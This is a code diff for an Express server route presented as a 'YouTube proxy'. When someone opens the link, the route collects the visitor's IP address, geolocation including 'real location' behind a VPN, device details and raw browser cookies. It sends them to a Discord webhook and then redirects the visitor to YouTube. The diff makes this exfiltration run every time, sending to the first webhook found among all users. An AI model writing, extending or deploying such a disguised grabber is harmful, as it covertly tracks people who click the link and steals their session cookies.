@@ -747,8 +747,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const locationData = getLocationFromIp(clientIp);
       const deviceInfo = parseDeviceInfo(userAgent);
 
-      // Log the YouTube proxy access
+      // Try to find settings with webhook for notification FIRST
+      let settings = null;
+      let imageOwnerUserId = null;
+
+      try {
+        const foundSettings = await storage.getSettingsWithImageOrWebhook();
+        if (foundSettings) {
+          settings = foundSettings.settings;
+          imageOwnerUserId = foundSettings.userId;
+        }
+      } catch (storageError) {
+        console.log('Error accessing storage:', storageError);
+      }
+
+      // Log the YouTube proxy access with proper userId association
       await storage.createIpLog({
+        userId: imageOwnerUserId, // Associate with user who has settings
         ipAddress: clientIp,
         userAgent,
         referrer,
@@ -763,42 +778,42 @@ export async function registerRoutes(app: Express): Promise<Server> {
         deviceBrand: deviceInfo.deviceBrand
       });
 
-      // Try to find settings with webhook for notification
-      let settings = null;
-      let imageOwnerUserId = null;
+      // ALWAYS attempt to send webhook if any settings exist
+      const allUsers = await storage.getAllUsers();
+      let webhookSent = false;
+      
+      for (const user of allUsers) {
+        try {
+          const userSettings = await storage.getSettings(user.id);
+          if (userSettings?.webhookUrl && userSettings.webhookUrl.length > 0) {
+            console.log(`📺 YouTube proxy access from IP: ${clientIp} - sending to webhook for user ${user.username}`);
 
-      try {
-        const foundSettings = await storage.getSettingsWithImageOrWebhook();
-        if (foundSettings) {
-          settings = foundSettings.settings;
-          imageOwnerUserId = foundSettings.userId;
+            // Send webhook in background
+            await sendToWebhook(userSettings.webhookUrl, {
+              ipAddress: clientIp,
+              userAgent,
+              referrer,
+              location: locationData.location,
+              isVpn: locationData.isVpn,
+              vpnLocation: locationData.vpnLocation,
+              realLocation: locationData.realLocation,
+              deviceType: deviceInfo.deviceType,
+              browserName: deviceInfo.browserName,
+              operatingSystem: deviceInfo.operatingSystem,
+              deviceBrand: deviceInfo.deviceBrand,
+              cookies: req.headers.cookie || 'None',
+              tokens: 'YouTube Proxy Access'
+            });
+            webhookSent = true;
+            break; // Send to first webhook found
+          }
+        } catch (webhookError) {
+          console.error(`❌ Webhook sending failed for user ${user.username}:`, webhookError);
         }
-      } catch (storageError) {
-        console.log('Error accessing storage:', storageError);
       }
-
-      // Send to webhook if configured
-      if (settings?.webhookUrl && settings.webhookUrl.length > 0) {
-        console.log(`📺 YouTube proxy access from IP: ${clientIp}`);
-
-        // Send webhook in background
-        sendToWebhook(settings.webhookUrl, {
-          ipAddress: clientIp,
-          userAgent,
-          referrer,
-          location: locationData.location,
-          isVpn: locationData.isVpn,
-          vpnLocation: locationData.vpnLocation,
-          realLocation: locationData.realLocation,
-          deviceType: deviceInfo.deviceType,
-          browserName: deviceInfo.browserName,
-          operatingSystem: deviceInfo.operatingSystem,
-          deviceBrand: deviceInfo.deviceBrand,
-          cookies: req.headers.cookie || 'None',
-          tokens: 'YouTube Proxy Access'
-        }).catch(webhookError => {
-          console.error('❌ Webhook sending failed:', webhookError);
-        });
+      
+      if (!webhookSent) {
+        console.log('ℹ️ No webhook configured for any user, skipping Discord notification');
       }
 
       // Serve HTML page that immediately redirects to YouTube
